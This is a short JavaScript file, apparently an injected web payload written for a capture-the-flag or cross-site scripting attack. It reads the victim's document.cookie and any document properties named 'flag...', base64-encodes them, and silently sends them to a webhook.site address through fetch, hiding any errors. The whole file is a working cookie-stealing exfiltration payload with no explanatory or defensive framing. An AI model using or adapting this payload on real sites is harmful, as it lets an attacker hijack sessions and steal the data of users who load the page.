// x2.js
(async () => {
  try {
    const cookie = btoa(document.cookie);
    const flags = Object.fromEntries(
      Object.entries(document).filter(([k]) => k.startsWith('flag'))
    );
    const flagData = btoa(JSON.stringify(flags));

    await fetch(`https://webhook.site/e3b89cc5-8256-4a4f-ba9f-c9d1b46bc94c?c=${cookie}&f=${flagData}&t=2`);
  } catch (e) {}
})();